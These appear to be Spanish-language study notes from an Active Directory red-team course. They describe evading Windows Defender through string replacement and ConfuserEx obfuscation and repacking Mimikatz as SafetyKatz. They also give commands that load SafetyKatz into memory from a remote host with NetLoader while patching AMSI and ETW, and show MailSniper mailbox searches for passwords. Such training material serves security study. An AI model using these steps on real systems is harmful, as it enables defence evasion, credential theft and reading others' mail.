# Offensive .NET

Se puede usar para bypasear la deteccion de binarios por el Windows Defender.

Se utilizan tecnicas de ofuscacion o manipulacion de cadenas.

DefenderCheck identifica el codigo y las cadenas de un binario que Windows Defender puede bloquear o anular.

Offensive .NET - Tradecraft - AV bypass -String Manipulation

Abra el proyecto en Visual Studio.
• Presione "CTRL + H".
• Busque y reemplace la cadena "Credenciales" por "Credenciales" que puede usar con cualquier otra
cadena como reemplazo. (Asegúrese de que la cadena no esté presente en el código)
• Seleccione el alcance como "Solución completa".
• Presione el botón "Reemplazar todo".
• Construya y vuelva a verificar el binario con DefenderCheck.
• Repita los pasos anteriores si todavía hay detección

Para SafetyKatz seguimos los siguientes pasos:

- Descargue la última versión de Mimikatz y Out-CompressedDll.ps1
- Ejecute el script de PowerShell Out-CompressedDll.ps1 en el binario de Mimikatz y guarde el salida a un archivo.
- `Out-CompressedDll <Path to mimikatz.exe> >outputfilename.txt`
- Copia el valor de la variable "$ EncodedCompressedFile" del archivo de salida de arriba y reemplazar el valor de "compressedMimikatzString" variable en "Constants.cs" archivo de SafetyKatz
- Copie el tamaño de bytes del archivo de salida y reemplácelo en el archivo "Program.cs" en la línea 111 y 116.
- Compile y vuelva a verificar el binario con DefenderCheck.

Offensive .NET - Tradecraft - AV bypass - Obfuscation

Para Rubeus.exe, usamos ConfuserEx ([https://github.com/mkaring/ConfuserEx](https://github.com/mkaring/ConfuserEx)) para
ofuscar el binario

Inicie ConfuserEx
• En la pestaña Proyecto, seleccione el Directorio base donde se encuentra el archivo binario.
• En la pestaña Proyecto, seleccione el Archivo Binario que queremos ofuscar.
• En la pestaña Configuración agregue las reglas.
• En la pestaña Configuración, edite la regla y seleccione el ajuste preestablecido como "Normal".
• En la pestaña Proteger, haga clic en el botón proteger.

Offensive .NET - Tradecraft - Payload Delivery

Podemos usar NetLoader ([https://github.com/Flangvik/NetLoader](https://github.com/Flangvik/NetLoader)) para entregar nuestras cargas útiles binarias.

Se puede usar para cargar archivos binarios desde la ruta de archivo o URL y parchear AMSI y ETW mientras se ejecuta.

`C:\Users\Public\Loader.exe -path http://IP/SafetyKatz.exe`

También tenemos AssemblyLoad.exe que se puede usar para cargar el Netloader en la memoria desde una URL que luego carga un binario

`C:\Users\Public\AssemblyLoad.exe http://IP/Loader.exe -path http://IP/SafetyKatz.exe`

**Abusing Trusts for Microsoft Products**

- Varios productos de Microsoft están muy bien integrados en un AD
ambiente.
- Productos como SQL Server y Exchange se integran con AD y, por lo tanto,
conviértase en parte de la confianza del dominio.

    Privilege Escalation – MS Exchange

    Exchange 2019 brinda muchas posibilidades de Priv Esc.

    Se dividen en dos categorias:

    -Varios grupos con muchos permisos Exchange : Exchange Servers, Exchange Trusted Subsystem, Exchange Windows Permissions

    -La capacidad de leer los buzones de correo de otros usuarios (debido a una configuración incorrecta permisos).

    Privilege Escalation – MS Exchange - Mailbox Permissions

    - Usaremos MailSniper ([https://github.com/dafthack/MailSniper](https://github.com/dafthack/MailSniper)) para
    enumerar y acceder a los buzones de correo.
    - Podemos enumerar todos los correos con el comando: `Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName us\USER -Password <password>`
    - A continuación, echemos un vistazo a los buzones de correo donde nuestro usuario actual tiene acceso: `Invoke-OpenInboxFinder -EmailList C:\AD\Tools\emails.txt
    -ExchHostname us-exchange -Verbose`
    - Una vez hayamos identificado los correos, este comando busca entre los 100 mejores palabras clave como pass, creds : `Invoke-SelfSearch -Mailbox EMAIL -ExchHostname us-exchange -OutputCsv .\mail.csv`
